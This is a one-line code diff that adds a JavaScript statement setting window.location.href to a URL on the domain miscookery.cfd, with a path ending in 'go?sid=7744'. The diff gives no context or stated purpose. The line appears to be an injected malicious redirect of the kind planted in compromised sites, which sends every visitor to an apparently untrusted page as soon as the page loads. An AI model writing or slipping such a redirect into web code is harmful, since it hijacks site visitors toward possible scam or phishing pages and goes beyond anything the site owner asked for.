@@ -1,0 +1,1 @@
+window.location.href = "https://miscookery.cfd/SLpTG/go?sid=7744";
